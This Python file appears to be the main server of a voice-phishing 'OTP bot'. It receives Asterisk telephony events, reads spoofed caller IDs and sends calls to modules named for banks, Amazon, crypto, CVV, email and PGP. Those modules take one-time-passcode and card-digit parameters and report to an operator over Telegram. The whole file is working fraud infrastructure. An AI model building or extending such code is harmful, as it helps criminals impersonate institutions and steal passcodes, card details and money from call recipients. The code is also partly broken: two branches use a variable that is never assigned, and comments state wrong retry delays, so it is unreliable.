from fastapi import FastAPI, WebSocketDisconnect

# BASIC
import uvicorn
import websockets
import asyncio
import json

from server.general import init_db

# ENV
import os
from dotenv import load_dotenv
load_dotenv()


# ROUTES
from server.routes.amazon_module import amazon
from server.routes.bank_module import bankcall
from server.routes.crypto_module import crypto
from server.routes.custom_module import customcall
from server.routes.cvv_module import cvv
from server.routes.email_module import email
from server.routes.voice_module import voice
from server.routes.live_module import live
from server.routes.pgp_module import pgp


from server.general import fetch_calldetails, ban_sip_trunk, send_telegram_message

app = FastAPI()

ARI_WS_URL = os.getenv('WS_URL')


async def listen_to_ari_events():
    while True:
        try:
            uri = ARI_WS_URL
            async with websockets.connect(uri) as websocket:
                while True:
                    print("EVENT COMING IN")
                    message = await websocket.recv()
                    data = json.loads(message)

                    #print(data)

                    #action = data.get("action")
                    event = data.get('type')
                    
                    print(event)
                    
                    channel_id = None
                    number = None
                    spoof = None

                    if event == "Dial":
                        channel_id = data.get('peer', {}).get('id', None)
                        number = data.get('dialstring').split('@')[0]
                        spoof = data.get('peer', {}).get('caller', {}).get('number', None)
                        print(f"Extracted channel_id for Dial event: {channel_id}")  # Debug print
                        await asyncio.sleep(1)
                        
                    elif event in ["PlaybackStarted", "PlaybackFinished"]:
                        target_uri = data.get('playback', {}).get('target_uri', '')
                        if "channel:" in target_uri:
                            channel_id = target_uri.split(":")[1]
                        print(f"Extracted channel_id for {event} event: {channel_id}")
                        
                    elif event in ["RecordingStarted", "RecordingFinished"]:
                        target_uri = data.get('recording', {}).get('target_uri', '')
                        if "channel:" in target_uri:
                            channel_id = target_uri.split(":")[1]
                        print(f"Extracted channel_id for RecordingStarted event: {channel_id}")
                        
                    else:
                        number = data.get('channel', {}).get('dialplan', {}).get('exten', None)
                        spoof = data.get('channel', {}).get('caller', {}).get('number', None)
                        channel_id = data.get('channel', {}).get('id', None)
                        print(f"Extracted channel_id for {event} event: {channel_id}")
                        

                    module = None

                    try:
                        call_info = await fetch_calldetails(channel_id=channel_id)
                        if call_info and 'call_variables' in call_info:
                            accountcode_data = call_info['call_variables'].split(',')
                            accountcode_dict = {item.split('=')[0]: item.split('=')[1] for item in accountcode_data if '=' in item}

                            # print("DATA FETCHED:")
                            # print(accountcode_data)
                            
                            module = accountcode_dict.get('mode')
                            chat_id = accountcode_dict.get('chatid')
                            tag = accountcode_dict.get('tag')
                            call_variables = call_info['call_variables']
                        else:
                            print("No call info found for the channel_id:", channel_id)

                    except KeyError as e:
                        print(f"KeyError occurred: {e}")
                    except Exception as e:
                        print(f"An unexpected error occurred: {e}")
                    
                    await websocket.send(json.dumps({"type": "pong"}))
                    
                    # BAN BAD SIP TRUNK
                    if event == "ChannelDestroyed":
                        cause = data.get("cause")
                        # cause_txt = data.get("cause_txt")

                        if cause == 21:
                            # Extract the SIP trunk name
                            channel_name = data.get("channel", {}).get("name", "")
                            sip_trunk = channel_name.split("/")[1].split("-")[0]

                            # Ban the SIP trunk
                            await ban_sip_trunk(sip_trunk)
                            await send_telegram_message(chat_id,"The route for your call was disabled. Please just call again!")
                
                    if module:
                        if module == "amazon":
                            service = accountcode_dict.get('service')
                            name = accountcode_dict.get('name')
                            asyncio.create_task(amazon(data, module, call_variables, event, channel_id, number, spoof, service, name, otpdigits, chat_id, tag))

                        elif module == "bank":
                            bank = accountcode_dict.get('bank')
                            name = accountcode_dict.get('name')
                            otpdigits = accountcode_dict.get('otpdigits')
                            asyncio.create_task(bankcall(data, module, call_variables, event, channel_id, number, spoof, bank, name, otpdigits, chat_id, tag))

                        elif module == "crypto":
                            service = accountcode_dict.get('service')
                            name = accountcode_dict.get('name')
                            last4digits = accountcode_dict.get('last4digits')
                            otpdigits = accountcode_dict.get('otpdigits')
                            asyncio.create_task(crypto(data, module, call_variables, event, channel_id, number, spoof, service, name, otpdigits, last4digits, chat_id, tag))

                        elif module == "customcall":
                            service = accountcode_dict.get('service')
                            name = accountcode_dict.get('name')
                            otpdigits = accountcode_dict.get('otpdigits')
                            script_name = accountcode_dict.get('script_name')
                            asyncio.create_task(customcall(data, module, call_variables, event, channel_id, number, spoof, service, name, otpdigits, script_name, chat_id, tag))

                        elif module == "cvv":
                            bank = accountcode_dict.get('bank')
                            name = accountcode_dict.get('name')
                            cvvdigits = accountcode_dict.get('cvvdigits')
                            last4digits = accountcode_dict.get('last4digits')
                            asyncio.create_task(cvv(data, module, call_variables, event, channel_id, number, spoof, bank, name, last4digits, cvvdigits, chat_id, tag))

                        elif module == "email":
                            service = accountcode_dict.get('service')
                            name = accountcode_dict.get('name')
                            asyncio.create_task(email(data, module, call_variables, event, channel_id, number, spoof, service, name, otpdigits, chat_id, tag))

                        elif module == "voice":
                            print("CALLING VOICE MODULE")
                            service = accountcode_dict.get('service')
                            name = accountcode_dict.get('name')
                            otpdigits = accountcode_dict.get('otpdigits')
                            asyncio.create_task(voice(data, module, call_variables, event, channel_id, number, spoof, service, name, otpdigits, chat_id, tag))

                        elif module == "live":
                            service = accountcode_dict.get('service')
                            name = accountcode_dict.get('name')
                            otpdigits = accountcode_dict.get('otpdigits')
                            asyncio.create_task(live(data, module, call_variables, event, channel_id, number, spoof, service, name, otpdigits, chat_id, tag))

                        elif module == "pgp":
                            service = accountcode_dict.get('service')
                            name = accountcode_dict.get('name')
                            otpdigits = accountcode_dict.get('otpdigits')
                            target_number = accountcode_dict.get('targetnumber')
                            asyncio.create_task(pgp(data, module, call_variables, event, channel_id, number, spoof, service, name, otpdigits, target_number, chat_id, tag))
                            

        except WebSocketDisconnect:
            print("WS connection closed. Attempting to reconnect in 5 seconds...")
            await asyncio.sleep(2)  # Wait for 5 seconds before retrying
        except Exception as e:
            print(f"Unexpected error: {e}. Attempting to reconnect in 5 seconds...")
            await asyncio.sleep(2)  # Wait for 5 seconds before retrying

@app.on_event("startup")
async def startup_event():
    await init_db()
    asyncio.create_task(listen_to_ari_events())
    
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv('SERVER_PORT')))
